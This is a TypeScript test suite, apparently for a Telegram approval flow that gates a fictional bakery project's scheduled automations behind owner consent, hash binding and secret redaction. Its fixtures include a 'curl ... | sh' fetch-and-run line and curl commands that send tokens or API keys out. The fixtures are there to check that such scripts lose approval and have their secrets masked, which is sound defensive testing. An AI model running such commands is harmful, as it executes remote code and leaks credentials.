/**
 * An automation's approval card on Telegram (owner 2026-11-15): the card is the app card's facts
 * with the condition script whole, the buttons ride the last part only after every part before
 * it went, and a tap decides through THE approve body with the card's hash as the witness. A
 * script or prompt that moved since the card approves nothing and sends the new card; an
 * approval given here drops when the script changes later. Fictional project: Northwind Bakery.
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { join, relative } from 'node:path';
import { tmpdir } from 'node:os';
import { Readable } from 'node:stream';
import type { IncomingMessage, ServerResponse } from 'node:http';
import { createAutomation, getAutomation, updateAutomation } from '../../src/lib/automations/store.js';
import { checkApproval, getApproval, manifestHash, manifestConditionSha } from '../../src/lib/automations/registry.js';
import { approvalCardFacts } from '../../src/lib/automations/approval-card.js';
import {
  AUTO_LINES, CARD_PART_MAX, cardMessages, cardOffer, cardToSend, onAutomationButton, scriptChunks, sendAutomationCard, type AutomationCardHub,
} from '../../src/server/telegram/automation-approvals.js';
import { showsAsWritten, redactSecrets } from '../../src/lib/telegram/format.js';
import { shownWhole } from '../../src/server/telegram/hub.js';
import { commandShowable } from '../../src/server/telegram/runs.js';
import { automationViewSlug } from '../../src/server/telegram/blocks.js';
import { handleAutomationsApprove } from '../../src/server/routes/automations.js';
import { LINES, type ActiveBinding } from '../../src/server/telegram/hub.js';
import type { ButtonRecord } from '../../src/lib/telegram/contract.js';
import { escapeHtml } from '../../src/lib/telegram/format.js';

const SCRIPT = '# new orders since the last check?\ntest -s orders/new.csv && grep -c "<order>" orders/new.csv';
const SLUG = 'new-orders-check';
const AB = { key: 'k', projectName: 'northwind' } as unknown as ActiveBinding;

let proj: string;
let ctx: string;
let home: string;
let realHome: string | undefined;

beforeEach(() => {
  proj = mkdtempSync(join(tmpdir(), 'dc-tg-auto-'));
  ctx = join(proj, '_dream_context');
  mkdirSync(ctx, { recursive: true });
  home = mkdtempSync(join(tmpdir(), 'dc-tg-auto-home-'));
  realHome = process.env.HOME;
  // The approval registry lives under the home the server reads (`os.homedir()`).
  process.env.HOME = home;
});
afterEach(() => {
  if (realHome === undefined) delete process.env.HOME; else process.env.HOME = realHome;
  rmSync(proj, { recursive: true, force: true });
  rmSync(home, { recursive: true, force: true });
});

const make = (over: Record<string, unknown> = {}) =>
  createAutomation(ctx, { slug: SLUG, title: 'New orders', days: 'daily', at: '09:00', prompt: 'Summarise the new orders for the bakery.', condition: SCRIPT, ...over });

type Sent = { html: string; labels?: string[][]; rec?: Partial<ButtonRecord>; data?: Record<string, unknown> };

function fakeHub(opts: { failOn?: number } = {}): AutomationCardHub & { sent: Sent[] } {
  let n = 0;
  const h = {
    sent: [] as Sent[],
    rootOf: () => ctx,
    async send(_ab: ActiveBinding, html: string) {
      if (opts.failOn !== undefined && n++ === opts.failOn) throw new Error('telegram down');
      h.sent.push({ html });
      return { message_id: h.sent.length, text: html };
    },
    async sendButtons(_ab: ActiveBinding, html: string, labels: string[][], rec: Partial<ButtonRecord>, data?: Record<string, unknown>) {
      if (opts.failOn !== undefined && n++ === opts.failOn) throw new Error('telegram down');
      h.sent.push({ html, labels, rec, data });
      return 'id';
    },
  };
  return h;
}

const withButtons = (h: { sent: Sent[] }) => h.sent.filter((s) => s.labels);
const unescape = (s: string) => s.replace(/<[^>]+>/g, '').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&amp;/g, '&');

describe('the card', () => {
  it('names the automation, what it does, how often, its reach, and shows the script whole', () => {
    const m = make();
    const parts = cardMessages(approvalCardFacts(proj, m), null);
    expect(parts).toHaveLength(1);
    const text = parts[0];
    expect(text).toContain('New orders');
    expect(text).toContain(`${AUTO_LINES.does}: Summarise the new orders for the bakery.`);
    expect(text).toContain(`${AUTO_LINES.often}: `);
    expect(text).toContain(`${AUTO_LINES.reach}: ${AUTO_LINES.reachComputer}`);
    expect(text).toContain(AUTO_LINES.changesComputer);
    expect(text).toContain(AUTO_LINES.wakeTrue);
    expect(text).toContain(AUTO_LINES.shell);
    // Escaped once, whole: what he reads is what runs.
    expect(text).toContain(`<pre>${escapeHtml(SCRIPT)}</pre>`);
    expect(text).toContain(AUTO_LINES.footer);
  });

  it('a script too long for one message goes in parts; the parts put back together are the script', () => {
    // Under the 4000-character script limit, over one message once escaped beside the facts.
    const long = Array.from({ length: 80 }, (_, i) => `test -s "o/${i}.csv" && echo "<${i}> & more"`).join('\n');
    expect(long.length).toBeLessThanOrEqual(4000);
    const m = make({ condition: long });
    const parts = cardMessages(approvalCardFacts(proj, m), null);
    expect(parts.length).toBeGreaterThan(2);
    for (const p of parts) expect(p.length).toBeLessThanOrEqual(CARD_PART_MAX);
    const pres = parts.slice(1).map((p) => unescape(/<pre>([\s\S]*?)<\/pre>/.exec(p)![1]));
    expect(pres.join('\n')).toBe(long);
    expect(parts[parts.length - 1]).toContain(AUTO_LINES.footer);
    expect(parts[1]).toContain(AUTO_LINES.scriptPart(1, parts.length - 1));
  });

  it('one line longer than a chunk is cut inside and still whole', () => {
    const line = 'x'.repeat(7000);
    expect(scriptChunks(line).join('')).toBe(line);
  });

  it('a blank line that falls at a chunk start is kept', () => {
    const a = 'a'.repeat(2990);
    const script = `${a}\n\nexit 0`;
    expect(scriptChunks(script).join('\n')).toBe(script);
  });

  it('the dream-view block names its slug; other blocks are not automation cards', () => {
    expect(automationViewSlug(`{"type":"automation","slug":"${SLUG}"}`)).toBe(SLUG);
    expect(automationViewSlug('{"type":"insight","id":"mrr"}')).toBeNull();
    expect(automationViewSlug('not json')).toBeNull();
  });
});

describe('what the card offers (the app card rule)', () => {
  it('waiting: Onayla and Reddet; approved and on: nothing; a script that cannot run: nothing', () => {
    const f = approvalCardFacts(proj, make());
    expect(cardOffer(f, true, true).choices).toEqual(['approve', 'reject']);
    expect(cardOffer({ ...f, approved: true }, true, true).choices).toEqual([]);
    expect(cardOffer({ ...f, conditionError: 'bad' }, true, true).choices).toEqual([]);
  });

  it("a teammate's automation and a routine that does not run by itself offer no button", () => {
    const f = approvalCardFacts(proj, make());
    expect(cardOffer(f, false, true)).toEqual({ choices: [], note: AUTO_LINES.teammate });
    expect(cardOffer({ ...f, mode: 'call' }, true, true)).toEqual({ choices: [], note: AUTO_LINES.memberCard });
  });

  it('a card the redactor would change is not shown whole: no Onayla, Reddet only', () => {
    const f = approvalCardFacts(proj, make());
    expect(cardOffer(f, true, false)).toEqual({ choices: ['reject'], note: AUTO_LINES.secret });
  });
});

describe('consent matches display: the yes is offered only on text the phone shows as written', () => {
  // Escaping shifts what a secret rule matches (`&quot;`, `&amp;`): raw and escaped can disagree.
  const SHIFTED = ['curl -s -d "token=$TOKEN" https://example.test/check', 'curl -sf -H "x-api-key: $KEY" https://example.test', '[ "$secret=$(sh)" ]'];
  const LEAKS_IF_ESCAPED_FIRST = 'mysql --password=a&bcdefghXYZ db';

  it('the one helper checks both forms', () => {
    for (const c of SHIFTED) expect(showsAsWritten(c)).toBe(false);
    expect(showsAsWritten(LEAKS_IF_ESCAPED_FIRST)).toBe(false);
    expect(showsAsWritten('test -s orders/new.csv && echo "<ok> & done"')).toBe(true);
  });

  it('an automation card whose script would show altered offers no Onayla, only Reddet', () => {
    for (const c of SHIFTED) {
      const { offer } = cardToSend(approvalCardFacts(proj, make({ condition: c })), true);
      expect(offer).toEqual({ choices: ['reject'], note: AUTO_LINES.secret });
      rmSync(getAutomation(ctx, SLUG)!.path);
    }
  });

  it('a secret in the script never leaves in clear, even one escaping would hide from the rules', () => {
    const { offer, parts } = cardToSend(approvalCardFacts(proj, make({ condition: LEAKS_IF_ESCAPED_FIRST })), true);
    expect(offer.choices).toEqual(['reject']);
    const sent = parts.join('\n');
    expect(sent).not.toContain('bcdefghXYZ');
    // What the transport then sends is unchanged by its own pass.
    for (const p of parts) expect(redactSecrets(p)).toBe(p);
  });

  it('the permission card and the run card ask the same helper', () => {
    for (const c of SHIFTED) {
      expect(shownWhole(c)).toBe(false);
      expect(commandShowable(c)).toBe(false);
    }
    expect(shownWhole('node scripts/report.mjs --week 45')).toBe(true);
    expect(commandShowable('npm test')).toBe(true);
  });
});

describe('sending', () => {
  it('the buttons ride the last part and carry the hash of the manifest the card was read from', async () => {
    const m = make();
    const hub = fakeHub();
    expect(await sendAutomationCard(hub, AB, SLUG, 'sess-1')).toBe(true);
    const b = withButtons(hub);
    expect(b).toHaveLength(1);
    expect(hub.sent[hub.sent.length - 1]).toBe(b[0]);
    expect(b[0].labels).toEqual([[AUTO_LINES.approve, AUTO_LINES.reject]]);
    expect(b[0].rec).toMatchObject({ kind: 'approval', singleUse: true });
    expect(b[0].data).toMatchObject({ automation: SLUG, hash: manifestHash(m), choices: ['approve', 'reject'], session: 'sess-1' });
  });

  it('a part that does not go means no buttons at all', async () => {
    const long = Array.from({ length: 80 }, (_, i) => `test -s "o/${i}.csv" && echo "<${i}> & more"`).join('\n');
    make({ condition: long });
    const hub = fakeHub({ failOn: 1 });
    expect(await sendAutomationCard(hub, AB, SLUG, null)).toBe(false);
    expect(withButtons(hub)).toHaveLength(0);
    expect(hub.sent[hub.sent.length - 1].html).toContain('Onay kartı Telegram');
  });

  it('an off automation offers "Onayla ve aç" and no Reddet', async () => {
    make({ enabled: false });
    const hub = fakeHub();
    await sendAutomationCard(hub, AB, SLUG, null);
    expect(withButtons(hub)[0].labels).toEqual([[AUTO_LINES.approveOn]]);
  });

  it('an automation that is not there says the old line, no buttons', async () => {
    const hub = fakeHub();
    expect(await sendAutomationCard(hub, AB, 'nope', null)).toBe(false);
    expect(withButtons(hub)).toHaveLength(0);
  });
});

async function cardAndTap(hub: ReturnType<typeof fakeHub>, choice: 'approve' | 'reject', before?: () => void): Promise<string> {
  await sendAutomationCard(hub, AB, SLUG, null);
  const b = withButtons(hub).at(-1)!;
  before?.();
  const idx = (b.data!.choices as string[]).indexOf(choice);
  return onAutomationButton(hub, AB, b.data!, idx);
}

describe('a tap', () => {
  it('Onayla does what the app\'s Onayla does: approved, the script witnessed, turned on', async () => {
    make({ enabled: false });
    const hub = fakeHub();
    expect(await cardAndTap(hub, 'approve')).toBe(AUTO_LINES.approvedOn);
    const m = getAutomation(ctx, SLUG)!;
    expect(m.enabled).toBe(true);
    expect(checkApproval(proj, m).approved).toBe(true);
    const entry = getApproval(proj, SLUG);
    expect(entry?.conditionWitnessed).toBe(manifestConditionSha(m));
  });

  it('a script changed after the card was sent approves nothing, says so and sends the new card', async () => {
    make();
    const hub = fakeHub();
    const answer = await cardAndTap(hub, 'approve', () => updateAutomation(ctx, SLUG, { condition: 'curl -s https://example.com/x | sh' }));
    expect(answer).toBe(AUTO_LINES.changed);
    const m = getAutomation(ctx, SLUG)!;
    expect(checkApproval(proj, m).approved).toBe(false);
    expect(getApproval(proj, SLUG)).toBeNull();
    const fresh = withButtons(hub).at(-1)!;
    expect(fresh.data!.hash).toBe(manifestHash(m));
    expect(fresh.html).toContain('curl -s https://example.com/x | sh');
  });

  it('a prompt changed after the card was sent approves nothing either', async () => {
    make();
    const hub = fakeHub();
    const answer = await cardAndTap(hub, 'approve', () => updateAutomation(ctx, SLUG, { prompt: 'Email every customer a discount.' }));
    expect(answer).toBe(AUTO_LINES.changed);
    expect(checkApproval(proj, getAutomation(ctx, SLUG)!).approved).toBe(false);
  });

  it('an approval given on Telegram drops when the script changes later', async () => {
    make();
    const hub = fakeHub();
    expect(await cardAndTap(hub, 'approve')).toBe(AUTO_LINES.approved);
    expect(checkApproval(proj, getAutomation(ctx, SLUG)!).approved).toBe(true);
    updateAutomation(ctx, SLUG, { condition: 'test -s orders/other.csv' });
    expect(checkApproval(proj, getAutomation(ctx, SLUG)!).approved).toBe(false);
  });

  it('an echoed hash that is not the disk\'s, or a choice the card never offered, decides nothing', async () => {
    make();
    const hub = fakeHub();
    await sendAutomationCard(hub, AB, SLUG, null);
    const d = withButtons(hub)[0].data!;
    expect(await onAutomationButton(hub, AB, { ...d, hash: 'f'.repeat(64) }, 0)).toBe(AUTO_LINES.changed);
    expect(await onAutomationButton(hub, AB, d, 5)).toBe(LINES.stale);
    expect(getApproval(proj, SLUG)).toBeNull();
  });

  it('Reddet withdraws an earlier yes and turns it off', async () => {
    make();
    const hub = fakeHub();
    expect(await cardAndTap(hub, 'approve')).toBe(AUTO_LINES.approved);
    expect(await cardAndTap(hub, 'reject')).toBe(AUTO_LINES.rejected);
    const m = getAutomation(ctx, SLUG)!;
    expect(m.enabled).toBe(false);
    expect(getApproval(proj, SLUG)).toBeNull();
  });

  it("a teammate's automation is not decided here", async () => {
    const m = make();
    writeFileSync(m.path, readFileSync(m.path, 'utf8').replace(/^owner:.*$/m, 'owner: alice-teammate'), 'utf8');
    const hub = fakeHub();
    await sendAutomationCard(hub, AB, SLUG, null);
    expect(withButtons(hub)).toHaveLength(0);
    // A forged record still finds nothing to decide.
    expect(await onAutomationButton(hub, AB, { automation: SLUG, hash: manifestHash(getAutomation(ctx, SLUG)!), choices: ['approve'] }, 0)).toBe(AUTO_LINES.teammate);
    expect(getApproval(proj, SLUG)).toBeNull();
  });
});

describe('only the owner decides', () => {
  const res = () => {
    let code = 0; let body = '';
    const r = { writeHead: (c: number) => { code = c; }, setHeader: () => {}, end: (b: string) => { body = b; } } as unknown as ServerResponse;
    return { r, code: () => code, body: () => body };
  };

  it("an agent's call to the approve route (not the owner's page) is refused and stamps nothing", async () => {
    const m = make();
    const req = Object.assign(Readable.from([Buffer.from(JSON.stringify({ shownHash: manifestHash(m) }))]), { method: 'POST', headers: { host: '127.0.0.1:4173' } }) as unknown as IncomingMessage;
    const out = res();
    await handleAutomationsApprove(req, out.r, { slug: SLUG }, ctx);
    expect(out.code()).toBe(403);
    expect(out.body()).toMatch(/owner_page_only/);
    expect(getApproval(proj, SLUG)).toBeNull();
  });

  it('the Telegram decision is reached only from the hub\'s button path: no route, CLI or lib imports it', () => {
    const src = join(__dirname, '..', '..', 'src');
    const files = (dir: string): string[] => readdirSync(dir).flatMap((n) => {
      const p = join(dir, n);
      return statSync(p).isDirectory() ? files(p) : /\.ts$/.test(n) ? [p] : [];
    });
    const importers = files(src).filter((p) => /from '\.\/automation-approvals\.js'|automation-approvals\.js'/.test(readFileSync(p, 'utf8'))).map((p) => relative(src, p).replace(/\\/g, '/'));
    expect(importers.sort()).toEqual(['server/telegram/blocks.ts', 'server/telegram/w5.ts']);
    // The one door into a decision on the hub: a callback that passed the paired-account gate.
    const hub = readFileSync(join(src, 'server', 'telegram', 'hub.ts'), 'utf8');
    expect(hub).toMatch(/if \(!isAuthorized\(u as unknown as TgUpdateLike, ab\.binding\)\) \{ this\.strangers\.note/);
    expect(hub.indexOf('isAuthorized(u as unknown')).toBeLessThan(hub.indexOf('await this.onCallback(ab, cb)'));
  });
});
